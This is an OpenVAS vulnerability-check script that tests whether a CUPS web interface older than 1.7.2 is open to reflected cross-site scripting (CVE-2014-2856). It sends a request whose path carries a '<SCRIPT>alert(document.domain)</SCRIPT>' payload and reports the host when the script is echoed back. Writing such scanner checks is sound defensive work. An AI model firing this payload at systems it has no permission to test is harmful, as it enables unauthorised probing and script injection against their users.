###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cupsd_xss_vuln.nasl 6637 2017-07-10 09:58:13Z teissa $
#
# CUPS Web Interface Cross Site Scripting Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apple:cups";
SCRIPT_OID = "1.3.6.1.4.1.25623.1.0.802071";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6637 $");
  script_cve_id("CVE-2014-2856");
  script_bugtraq_id(66788);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-10 11:58:13 +0200 (Mon, 10 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-04-22 13:16:12 +0530 (Tue, 22 Apr 2014)");
  script_name("CUPS Web Interface Cross Site Scripting Vulnerability");

tag_summary =
"This host is installed with CUPS and is prone to cross site scripting
vulnerability";

tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to get
domain or not.";

  tag_insight =
"Flaws is due to is_path_absolute() function does not validate input via URL
path before returning it to users.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.

Impact Level: Application";

  tag_affected =
"Common Unix Printing System (CUPS) version before 1.7.2";

tag_solution =
"Upgrade to version 1.7.2, or higher,
For updates refer to http://www.cups.org/software.php";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://www.cups.org/str.php?L4356");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/57880/");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2014/04/14/2");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("secpod_cups_detect.nasl");
  script_mandatory_keys("CUPS/installed");
  script_require_ports("Services/www", 631);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

cups_port = "";
dir = "";
url = "";
req = "";
res = "";
soc = "";

## Get HTTP Port
if(!cups_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:cups_port)){
  exit(0);
}

## Construct and Send Crafted request
url = dir + "<SCRIPT>alert(document.domain)</SCRIPT>.shtml";
req = http_get(item:url, port:cups_port);

soc = open_sock_tcp(cups_port, transport:ENCAPS_IP);
if(!soc){
  exit(0);
}
send(socket:soc, data:req);
res  = recv(socket:soc, length:1000);
close(soc);

## Patched version replay with specific code/message
if("403 Forbidden" >!< res && "<SCRIPT>alert(document.domain)</SCRIPT>" >< res)
{
  security_message(cups_port);
  exit(0);
}
